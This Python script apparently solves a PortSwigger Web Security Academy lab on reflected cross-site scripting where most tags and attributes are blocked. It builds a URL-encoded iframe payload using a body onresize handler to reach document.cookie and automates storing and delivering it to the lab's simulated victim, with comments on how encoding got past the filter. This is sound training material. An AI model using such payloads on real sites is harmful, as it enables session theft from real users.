# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
import requests

requests.packages.urllib3.disable_warnings()

verify = False
proxy = "127.0.0.1:8080"
scheme = "https://"
proxies = {scheme: proxy}
host = "ac091fdc1e4250b480b9a810001d00ba.web-security-academy.net"
lab_url_endpoint = scheme + host

# https://www.tutorialspoint.com/html/html_url_encoding.htm
# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
# <iframe src="https://your-lab-id.web-security-academy.net/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
# %22%3E%3Cbody%20onresize=alert(document.cookie)%3E"
# "><body onresize=alert(document.cookie)>"
exploit_url_endpoint = (
    scheme + "ac581fed1e7b509d80fea8ef01ef00f4.web-security-academy.net"
)
payload = f"<iframe src=\"{lab_url_endpoint}/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E\" onload=this.style.width='100px'>"
# payload = (
#     f'<iframe src="{lab_url_endpoint}/?search="><body onresize=alert(document.cookie)>"'
# )
# If i do not url in code the payload, then the server will html encode the output, thereby rendering the payload useless:
# <textarea required rows="12" cols="300" name="responseBody">&lt;iframe src=&quot;https://ac091fdc1e4250b480b9a810001d00ba.web-security-academy.net/?search=&quot;&gt;&lt;body onresize=alert(document.cookie)&gt;&quot;</textarea>
# Correct payload response body:
# <textarea required rows="12" cols="300" name="responseBody">&lt;iframe src=&quot;https://ac091fdc1e4250b480b9a810001d00ba.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E&quot; onload=this.style.width=&apos;100px&apos;&gt;</textarea>

# Equivalent of clicking the store button on the exploit page
data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK?",
    "Content-Type": "text/html; charset=utf-8",
    "responseBody": payload,
    "formAction": "STORE",
}
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)

# Equivalent of clicking the deliver to victim button on the exploit page
data["formAction"] = "DELIVER_TO_VICTIM"
requests.post(url=exploit_url_endpoint, verify=verify, proxies=proxies, data=data)

# cookies = {"session": "AGRNiMmVvgKqswe8kC7daXNv6Vq7LWbz"}
# params = {"search": "%22%3E%3Cbody%20onresize=alert(document.cookie)%3E\" onload=this.style.width='100px'>"}
# requests.get(url=lab_url_endpoint, verify=verify, proxies=proxies, params=params, cookies=cookies)

# When directly hitting the lab endpoint, the WAF correctly url encoded the payload. Actually it is more correct
# to say it escaped the url encoded payload so that it wouldn't be interpreted as active content. After all, the payload
# was already url encoded. However, when using the exploit server, the same payload works. This suggests to me that the
# exploit server is imitating being within WAF by being on the same network. Response body:
# <h1>0 search results for '%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>'</h1>
